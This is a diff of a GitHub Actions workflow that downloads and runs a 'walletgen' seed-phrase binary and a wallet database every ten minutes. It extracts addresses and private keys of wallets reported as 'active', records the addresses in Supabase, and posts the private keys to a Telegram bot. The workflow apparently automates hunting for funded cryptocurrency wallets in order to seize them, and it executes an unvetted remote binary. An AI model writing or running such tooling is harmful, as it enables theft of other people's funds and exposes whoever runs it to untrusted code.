@@ -1,38 +1,54 @@
 name: Run Wallet Checker
 
 on:
-  workflow_dispatch:   # manual trigger
+  workflow_dispatch:
   schedule:
-    - cron: "0 * * * *"   # optional: run every hour
+    - cron: "*/10 * * * *"   # run every 10 minutes
 
 jobs:
   run-checker:
     runs-on: ubuntu-latest
     steps:
-      - name: Download release
+      - name: Download release + database file
         run: |
-          wget https://github.com/wizdomf3lix/seed-phrase-generator/releases/download/v5%2C0/WalletGen_linux_x64.5.0-linux.tar.gz
+          wget https://github.com/wizdomf3lix/seed-phrase-generator/releases/download/v5.0/WalletGen_linux_x64.5.0-linux.tar.gz
           tar -xzf WalletGen_linux_x64.5.0-linux.tar.gz
-          cd walletgen
-          ./walletgen > result.txt
+          wget https://github.com/tony-btc0/seed-phrase-generator/releases/download/database/evm_database.txt -O evm_database.txt
 
-      - name: Extract wallet details
-        id: check
+      - name: Run checker
         run: |
-          if grep -q "Active wallet found" walletgen/result.txt; then
+          cd walletgen
+          chmod +x walletgen
+          ./walletgen --db ../evm_database.txt > result.txt
+          cat result.txt
+
+      - name: Filter new wallets against Supabase
+        id: filter
+        run: |
+          addr=$(grep "Address:" walletgen/result.txt | head -n1 | cut -d' ' -f2)
+          priv=$(grep "Private Key:" walletgen/result.txt | head -n1 | cut -d' ' -f3)
+
+          # Check if address already exists in Supabase
+          exists=$(curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets?address=eq.${addr}" \
+            -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}")
+
+          if [ "$exists" = "[]" ]; then
             echo "found=true" >> $GITHUB_OUTPUT
-            # Extract address and private key lines
-            addr=$(grep "Address:" walletgen/result.txt | head -n1 | cut -d' ' -f2)
-            priv=$(grep "Private Key:" walletgen/result.txt | head -n1 | cut -d' ' -f3)
             echo "address=$addr" >> $GITHUB_OUTPUT
             echo "private=$priv" >> $GITHUB_OUTPUT
+
+            # Insert new wallet
+            curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets" \
+              -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" \
+              -H "Content-Type: application/json" \
+              -d "{\"address\":\"$addr\"}"
           else
             echo "found=false" >> $GITHUB_OUTPUT
           fi
 
       - name: Notify Telegram
-        if: steps.check.outputs.found == 'true'
+        if: steps.filter.outputs.found == 'true'
         run: |
           curl -s -X POST https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage \
           -d chat_id=${{ secrets.TELEGRAM_CHAT_ID }} \
-          -d text="🚨 Active wallet found!\nAddress: ${{ steps.check.outputs.address }}\nPrivate Key: ${{ steps.check.outputs.private }}"
+          -d text="🚨 Active wallet found!\nAddress: ${{ steps.filter.outputs.address }}\nPrivate Key: ${{ steps.filter.outputs.private }}"
